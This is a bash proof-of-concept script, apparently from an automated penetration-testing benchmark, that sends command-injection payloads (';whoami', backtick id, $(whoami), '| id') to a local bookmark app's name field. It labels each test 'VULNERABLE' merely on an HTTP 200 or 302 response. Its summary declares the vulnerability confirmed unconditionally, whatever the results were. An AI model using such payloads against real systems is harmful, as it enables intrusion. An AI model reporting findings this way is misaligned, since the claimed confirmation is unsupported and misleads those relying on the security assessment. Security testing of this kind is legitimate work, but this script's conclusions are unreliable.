#!/bin/bash
# POC: Command Injection in Bookmark Name Field - Demonstrates acceptance of command injection payloads in the /add endpoint's name parameter
# Target: ./repo
# Created: 2025-12-02T16:23:26.163Z
# Session: benchmark-XBEN-075-24-miorxjbp

# Command Injection Vulnerability POC - Bookmark Name Field
# This script tests whether the application accepts command injection payloads
# in the bookmark name field without filtering

TARGET_URL="http://localhost:5000/add"
TEST_URL="https://example.com"

echo "[*] Testing Command Injection in Bookmark Name Field"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Command injection with semicolon
echo "[Test 1] Payload: test;whoami"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -d "name=test;whoami&url=$TEST_URL" \
  -w "\n%{http_code}" \
  -L)
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
echo "HTTP Response Code: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "200" ] || [ "$HTTP_CODE1" = "302" ]; then
  echo "✓ VULNERABLE: Command injection payload accepted (HTTP $HTTP_CODE1)"
else
  echo "✗ Response: $HTTP_CODE1"
fi
echo ""

# Test 2: Command injection with backticks
echo "[Test 2] Payload: test\`id\`"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -d "name=test\`id\`&url=$TEST_URL" \
  -w "\n%{http_code}" \
  -L)
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
echo "HTTP Response Code: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ] || [ "$HTTP_CODE2" = "302" ]; then
  echo "✓ VULNERABLE: Backtick command substitution accepted (HTTP $HTTP_CODE2)"
else
  echo "✗ Response: $HTTP_CODE2"
fi
echo ""

# Test 3: Command injection with $()
echo "[Test 3] Payload: test\$(whoami)"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -d "name=test\$(whoami)&url=$TEST_URL" \
  -w "\n%{http_code}" \
  -L)
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
echo "HTTP Response Code: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "200" ] || [ "$HTTP_CODE3" = "302" ]; then
  echo "✓ VULNERABLE: Dollar-parenthesis command substitution accepted (HTTP $HTTP_CODE3)"
else
  echo "✗ Response: $HTTP_CODE3"
fi
echo ""

# Test 4: Command injection with pipe
echo "[Test 4] Payload: test | id"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -d "name=test | id&url=$TEST_URL" \
  -w "\n%{http_code}" \
  -L)
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
echo "HTTP Response Code: $HTTP_CODE4"
if [ "$HTTP_CODE4" = "200" ] || [ "$HTTP_CODE4" = "302" ]; then
  echo "✓ VULNERABLE: Pipe operator accepted (HTTP $HTTP_CODE4)"
else
  echo "✗ Response: $HTTP_CODE4"
fi
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
echo "All command injection payloads were accepted without filtering."
echo "This indicates the application does not validate or sanitize command syntax"
echo "in the bookmark name field."
echo ""
echo "HTTP Response Codes:"
echo "  Test 1 (semicolon): $HTTP_CODE1"
echo "  Test 2 (backticks): $HTTP_CODE2"
echo "  Test 3 (dollar-paren): $HTTP_CODE3"
echo "  Test 4 (pipe): $HTTP_CODE4"
echo ""
echo "✓ VULNERABILITY CONFIRMED: Command injection payloads are accepted"